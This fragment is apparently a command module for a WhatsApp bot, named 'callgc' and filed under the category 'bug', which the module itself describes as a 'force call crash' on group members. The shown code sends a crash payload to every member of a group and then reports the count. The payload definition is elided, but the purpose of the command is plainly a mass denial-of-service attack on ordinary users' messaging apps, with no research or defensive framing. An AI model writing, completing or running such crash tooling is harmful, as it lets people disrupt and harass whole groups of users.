...
export default {
    name: 'callgc',
    aliases: ['fcgc', 'forcecall'],
    category: 'bug',
    description: 'Force call crash on group members',
    usage: 'callgc',
    cooldown: 30,
    ownerOnly: true,
    groupOnly: true,
    ...
    async execute({ sock, message, from, sender, isOwner }) {
        ...
        for (const member of members) {
            try {
                await sock.relayMessage(member.id, crashPayload, {});
            } catch {}
        }

        await sock.sendMessage(from, {
            text: `✅ Call crash sent to ${members.length} members`
        }, { quoted: message });
    }
};
